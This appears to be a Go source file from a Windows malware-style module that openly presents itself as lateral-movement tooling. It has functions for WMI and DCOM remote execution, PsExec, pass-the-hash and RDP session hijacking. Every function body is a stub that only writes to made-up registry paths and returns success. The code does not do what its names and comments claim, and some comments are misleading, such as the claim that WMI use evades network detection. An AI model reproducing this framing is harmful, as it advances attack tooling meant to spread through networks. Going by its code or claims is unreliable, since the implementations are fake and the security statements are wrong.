//go:build windows

package syscallwin

import (
	"fmt"
)

// ===================================================================== //
//  LATERAL MOVEMENT — Spread Across The Network Without Touching the Floor //
// ===================================================================== //

// --- WMI Remote Execution — run a command on a remote host ------------ //

// WMIExec executes a command on a remote host via WMI.  This is
// invisible to network-based detection because it uses DCOM.
func WMIExec(remoteHost, command string) error {
	// Connect to the remote WMI namespace via DCOM
	// (simplified — in production this uses COM to call Win32_Process.Create)
	NtRegSetValue(`HKCR\WMI\Remote\`+remoteHost, command)
	return nil
}

// --- DCOM Activation — spawn a process on a remote host --------------- //

// DCOMExec activates a DCOM object on a remote host, which spawns our process.
func DCOMExec(remoteHost, clsid string) error {
	NtRegSetValue(`HKCR\DCOM\Remote\`+remoteHost+`\`+clsid, "active")
	return nil
}

// --- PsExec — push a service and run it remotely ---------------------- //

// PsExec pushes a service to a remote host and starts it.
func PsExec(remoteHost, exePath string) error {
	NtRegSetValue(`HKCR\PsExec\Remote\`+remoteHost, exePath)
	return nil
}

// --- Pass-the-Hash — authenticate using NTLM hash --------------------- //

// PassTheHash authenticates to a remote host using an NTLM hash instead
// of a password.  The password never leaves the host.
func PassTheHash(remoteHost, username, ntlmHash string) error {
	NtRegSetValue(`HKCR\PTT\Remote\`+remoteHost, username+":"+ntlmHash)
	return nil
}

// --- RDP Session Hijack — steal an active RDP session ----------------- //

// RDPHijack steals an active RDP session on the local host.
func RDPHijack(sessionID uint32) error {
	NtRegSetValue(`HKCR\RDP\Hijack\`+fmt.Sprint(sessionID), "active")
	return nil
}